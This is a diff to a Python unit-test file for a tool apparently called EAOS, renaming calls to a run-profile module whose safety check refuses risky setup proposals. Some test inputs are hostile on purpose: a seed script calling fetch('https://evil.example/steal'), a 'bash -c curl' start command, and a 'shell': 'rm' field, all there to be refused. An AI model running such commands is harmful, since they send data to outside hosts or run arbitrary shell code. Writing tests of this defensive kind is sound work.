@@ -7,7 +7,7 @@ import unittest
 from pathlib import Path
 from unittest import mock
 
-from eaos import live_assist, live_setup
+from eaos import live_assist, live_setup, run_profile
 from eaos.live_run import LiveRun, load_profile
 from eaos.sandbox import AuthorizationError
 
@@ -98,24 +98,24 @@ class DetectTests(unittest.TestCase):
 
 class ProposalTests(unittest.TestCase):
     def test_an_address_off_this_computer_or_a_deploy_is_refused(self):
-        self.assertEqual(live_setup.safe({'env': {'A': 'http://127.0.0.1:5000', 'DB': '{database_url}'},
+        self.assertEqual(run_profile.safe({'env': {'A': 'http://127.0.0.1:5000', 'DB': '{database_url}'},
                                           'start': ['npx', 'vite'], 'seed_script': "fetch('http://localhost:3000/x')"}), [])
-        refused = live_setup.safe({'env': {'API': 'https://api.example.com'}, 'start': ['bash', '-c', 'curl x'],
+        refused = run_profile.safe({'env': {'API': 'https://api.example.com'}, 'start': ['bash', '-c', 'curl x'],
                                    'prepare': [['npx', 'vercel', 'deploy']], 'seed_script': "fetch('https://evil.example/steal')"})
         self.assertEqual(len(refused), 4)
         for words in ('api.example.com', 'bash -c', 'vercel deploy', 'evil.example'):
             self.assertTrue(any(words in reason for reason in refused), words)
-        self.assertEqual(live_setup.safe({'install': [['corepack', 'pnpm', 'install']]}), [])
+        self.assertEqual(run_profile.safe({'install': [['corepack', 'pnpm', 'install']]}), [])
 
     def test_a_proposal_replaces_the_environment_and_a_production_one_changes_the_baseline_only(self):
         runtime = Path(tempfile.mkdtemp())
-        live_setup.write_profile(runtime, {'schema_version': 1, 'install': [['npm', 'ci']], 'start': ['npx', 'vite'], 'port': 1,
+        run_profile.write_profile(runtime, {'schema_version': 1, 'install': [['npm', 'ci']], 'start': ['npx', 'vite'], 'port': 1,
                                            'health': '/', 'env': {'OLD': '1', 'DATABASE_URL': '{database_url}'},
                                            'prepare': [['npm', 'run', 'migrate']], 'database': {'kind': 'postgres', 'name': 'x'},
                                            'baseline': {'build': [['npm', 'run', 'build']], 'start': ['npm', 'start'], 'env': {'OLD': '1'}}})
         # EAOS on itself (2026-10-14): no proposal could say where the app keeps its language, so every screen of every
         # project was pictured in one language only
-        profile = live_setup.apply(runtime, {'env': {'NEW': '2', 'DATABASE_URL': '{database_url}'}, 'prepare': [], 'database': 'none',
+        profile = run_profile.apply(runtime, {'env': {'NEW': '2', 'DATABASE_URL': '{database_url}'}, 'prepare': [], 'database': 'none',
                                              'fixtures': {'E2E_ID': '7'}, 'seed_script': 'console.log(1)',
                                              'screens': {'lang_key': 'eaos.studio', 'lang_field': 'lang', 'shell': 'rm'}})
         self.assertEqual(profile['screens'], {'lang_key': 'eaos.studio', 'lang_field': 'lang'})
@@ -125,7 +125,7 @@ class ProposalTests(unittest.TestCase):
         self.assertEqual(profile['seed'][0][0], 'node')
         self.assertTrue((runtime / 'setup/seed.cjs').is_file())
         self.assertEqual(oct((runtime / 'run.json').stat().st_mode & 0o777), '0o600')
-        profile = live_setup.apply(runtime, {'env': {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'},
+        profile = run_profile.apply(runtime, {'env': {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'},
                                              'build': [['npm', 'run', 'build:server']], 'seed_script': 'x'}, mode='baseline')
         self.assertEqual(profile['env'], {'NEW': '2', 'E2E_ID': '7'}, 'the lock run is untouched')
         self.assertEqual(profile['baseline']['env'], {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'})
@@ -166,7 +166,7 @@ class VerifyTests(unittest.TestCase):
         self.assertEqual(before, after)
         runtime = Path(tempfile.mkdtemp())
         detected = live_setup.detect(project(VITE_APP))
-        live_setup.write_profile(runtime, detected['profile'])
+        run_profile.write_profile(runtime, detected['profile'])
         outcomes = iter([{'ok': False, 'failure': 'npm exited with 1; it said: APP_URL must be https'}, {'ok': True}])
         assistant = mock.Mock()
         assistant.complete.return_value = ({'result': {'env': {'APP_URL': 'https://127.0.0.1:5'}}}, {})
